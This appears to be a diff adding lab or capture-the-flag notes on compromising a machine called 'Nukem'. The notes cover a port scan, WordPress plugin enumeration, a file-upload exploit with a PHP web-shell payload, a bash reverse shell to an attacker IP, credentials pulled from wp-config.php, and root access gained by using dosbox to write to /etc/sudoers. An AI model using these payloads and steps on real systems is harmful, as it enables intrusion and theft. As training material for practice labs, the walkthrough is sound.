@@ -1,0 +1,95 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.179.105 > Nukem.txt
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
+|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
+|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
+80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
+|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-generator: WordPress 5.5.1
+|_http-title: Retro Gamming &#8211; Just another WordPress site
+3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
+5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
+|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
+|_http-title: 404 Not Found
+13000/tcp open  http        nginx 1.18.0
+|_http-title: Login V14
+|_http-server-header: nginx/1.18.0
+| http-methods: 
+|_  Supported Methods: GET HEAD
+36445/tcp open  netbios-ssn Samba smbd 4
+
+
+$ wpscan --url http://192.168.179.105 --enumerate ap --plugins-detection aggressive # use ap to find more vulnerable plugins
+Apache/2.4.46 (Unix) PHP/7.4.10
+WordPress version 5.5.1
+akismet Version: 4.1.6
+tutor Version: 1.5.3
+simple-file-list Version: 4.2.2
+relative-url Version: 0.1.7
+
+$ searchsploit WordPress Plugin Tutor.1.5.3 -o # not working
+WordPress Plugin Tutor.1.5.3 - Local File Inclusion | php/webapps/48058.txt
+
+$ searchsploit simple file list -o
+WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload | php/webapps/48979.py
+WordPress Plugin Simple File List 4.2.2 - Remote Code Execution | php/webapps/48449.py
+
+$ searchsploit -m 48979.py
+
+change payload to payload = '<?php system($_REQUEST["cmd"]) ?>'
+$ python3 48979.py http://192.168.179.105
+[ ] File 154.png generated with password: dbdeb3b2483dd6c6e57526802a894c95
+[ ] File uploaded at http://192.168.179.105/wp-content/uploads/simple-file-list/154.png
+[ ] File moved to http://192.168.179.105/wp-content/uploads/simple-file-list/154.php
+[+] Exploit seem to work.
+[*] Confirmning ...
+http://192.168.179.105/wp-content/uploads/simple-file-list/154.php?cmd=id
+uid=33(http) gid=33(http) groups=33(http)
+uname -a
+Linux nukem 5.8.9-arch2-1 #1 SMP PREEMPT Sun, 13 Sep 2020 23:44:55 +0000 x86_64 GNU/Linux
+
+# change payload to '<?php passthru("bash -i >& /dev/tcp/192.168.45.197/13000 0>&1"); ?>' can direct get a shell
+$ rlwrap nc -nlvp 13000
+listening on [any] 13000 ...
+connect to [192.168.45.197] from (UNKNOWN) [192.168.179.105] 41598
+bash: cannot set terminal process group (350): Inappropriate ioctl for device
+bash: no job control in this shell
+[http@nukem simple-file-list]$ id
+id
+uid=33(http) gid=33(http) groups=33(http)
+
+# Found vnc session and confirm run on port 5901 
+root         363  0.0  0.1   5888  3428 ?        Ss   01:43   0:00 /usr/bin/vncsession commander :1
+root         364  0.0  0.0      0     0 ?        Z    01:43   0:00 [vncsession] <defunct>
+127.0.0.1:5901
+[http@nukem .vnc]$ cat nukem:1.log
+Listening for VNC connections on local interface(s), port 5901
+
+cat /srv/http/wp-config.php
+commander:CommanderKeenVorticons1990
+
+# make a redirecting 
+$ ssh -L 5901:localhost:5901 commander@192.168.179.105
+The authenticity of host '192.168.179.105 (192.168.179.105)' can't be established.
+ED25519 key fingerprint is: SHA256:xonp3jokwQ/DxrvEZ7jnNNoA6GH8t48bnZeogoJIFqg
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.179.105' (ED25519) to the list of known hosts.
+commander@192.168.179.105's password: 
+[commander@nukem ~]$ id
+uid=1000(commander) gid=1000(commander) groups=1000(commander)
+
+$ vncviewer 127.0.0.1:5901 # the dosbox cmd have to run in GUI
+commander@nukem ~]$ LFILE='/etc/sudoers'
+[commander@nukem ~]$ dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >>c:$LFILE" -c exit
+[commander@nukem ~]$ sudo -s
+[root@nukem /]# id 
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
